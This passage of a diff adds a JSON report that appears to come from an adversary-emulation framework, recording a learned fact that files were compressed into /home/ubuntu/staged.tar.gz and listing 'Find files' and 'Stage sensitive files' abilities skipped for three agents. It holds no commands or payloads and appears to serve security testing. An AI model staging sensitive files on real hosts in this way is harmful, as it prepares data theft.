+        "qtsxfp",
+        "jcwdsq",
+        "gnayxz"
+      ],
+      "unique": "host.dir.compress/home/ubuntu/staged.tar.gz",
+      "value": "/home/ubuntu/staged.tar.gz",
+      "trait": "host.dir.compress",
+      "origin_type": "LEARNED"
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "qtsxfp": [
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        }
+      ]
+    },
+    {
+      "jcwdsq": [
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        }
+      ]
+    },
+    {
+      "gnayxz": [
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 2,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        }
+      ]
+    }
+  ]
+}
